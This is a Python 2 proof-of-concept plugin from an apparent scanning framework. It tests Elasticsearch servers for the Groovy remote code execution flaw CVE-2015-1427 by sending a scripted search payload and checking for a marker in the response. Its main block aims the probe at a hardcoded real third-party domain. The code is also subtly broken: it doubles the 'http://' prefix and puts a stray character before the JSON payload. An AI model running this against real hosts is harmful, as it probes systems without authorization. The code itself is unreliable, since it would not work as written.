#!/usr/bin/env python
# -*- coding: utf-8 -*-


from ..miniCurl import Curl
from ..t  import T

import socket, urlparse




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip
        curl=Curl()
        result = {}
        result['result']=False

        url = "http://"+arg+":"+port+"/_search?pretty"
        data = '''r{"size":1,"script_fields": {"my_field": {"script": "def res=\\"3b8096391df29b2ce44a81b9e436f769\\";res","lang":"groovy"}}}'''
        code, head, res, errcode, finalurl = curl.curl2(url, post=data)
        if res.find('3b8096391df29b2ce44a81b9e436f769') != -1 and "Parse Failure" not in res:
            output('ElasticSearch Groovy remote code exec(CVE-2015-1427)', result, 'hole')
        del curl
        return result


def output(url,result,label):
    info = url + '  elasticsearch  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='Command Execution Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/component/elasticsearch/ip_297ab6cee76b13281453e033ea17df44.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/ip/ip_297ab6cee76b13281453e033ea17df44.py
#/root/github/poccreate/codesrc/exp-361.py